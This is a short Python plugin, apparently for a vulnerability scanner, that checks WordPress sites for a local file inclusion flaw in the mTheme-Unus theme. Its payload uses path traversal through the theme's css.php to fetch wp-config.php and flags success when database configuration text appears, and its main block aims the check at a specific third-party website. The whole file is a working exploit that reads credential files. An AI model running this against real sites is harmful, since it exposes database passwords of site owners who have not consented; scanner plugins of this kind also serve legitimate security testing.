#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = FF0C
#___Refer__ = https://packetstormsecurity.com/files/133778/WordPress-mTheme-Unus-Local-File-Inclusion.html
#_FileName_ = wp_mTheme-Unus_file inclusion vulnerability.py

 
def assign(service, arg):
    if service =="wordpress":
        return True, arg
 
def audit(arg):
    payload = 'wp-content/themes/mTheme-Unus/css/css.php?files=../../../../wp-config.php'
    url = arg + payload
    code, head, res, errcode, final_url = curl.curl2(url);
    if code == 200 and 'MySQL' in res and 'define' in res:
        security_hole(url)
                
if __name__ =='__main__':
    from dummy import*
    audit(assign('wordpress', 'http://rmg-saintpierre.re/')[1])